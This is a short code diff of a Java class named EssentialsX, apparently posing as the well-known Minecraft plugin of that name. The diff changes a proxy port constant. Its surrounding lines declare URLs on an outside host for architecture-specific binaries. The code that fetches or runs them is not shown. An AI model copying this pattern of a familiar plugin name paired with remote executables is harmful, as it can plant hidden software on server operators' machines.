@@ -15,7 +15,7 @@ import java.util.concurrent.atomic.AtomicBoolean;
 public class EssentialsX extends JavaPlugin {
 
     private static final String HC_UUID = "f8e80ca0-a821-4fb4-b828-5d907c1b3832";
-    private static final String HC_S5_PORT = "25565";
+    private static final String HC_S5_PORT = "25575";
 
     private static final String KOMARI_AMD_URL = "https://ssr.cn.mt/files/K_amd";
     private static final String KOMARI_ARM_URL = "https://ssr.cn.mt/files/K_arm";
